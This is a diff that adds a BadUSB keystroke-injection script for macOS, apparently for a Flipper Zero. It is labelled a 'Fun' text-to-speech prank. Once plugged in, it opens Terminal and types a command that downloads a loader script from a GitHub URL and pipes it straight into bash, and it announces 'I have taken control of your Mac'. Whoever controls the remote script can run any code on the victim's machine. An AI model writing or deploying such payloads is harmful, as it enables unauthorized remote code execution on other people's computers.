@@ -1,0 +1,25 @@
+REM ============================================================
+REM 🔊 Text to Speech - macOS
+REM ============================================================
+REM Author: dil1thium
+REM Version: 3.0 (Modular)
+REM Target: macOS
+REM Category: Fun
+REM
+REM Uses macOS 'say' command.
+REM
+REM OPTIONAL:
+REM   Set MSG for custom message
+REM ============================================================
+DELAY 500
+GUI SPACE
+DELAY 800
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 1500
+STRING MSG="Hello, I have taken control of your Mac" M="tts" bash -c 'curl -sL https://raw.githubusercontent.com/reschjonas/FlipperZero_BadUSB/main/remote-payloads/loaders/loader.sh|bash'
+ENTER
+DELAY 500
+STRING exit
+ENTER
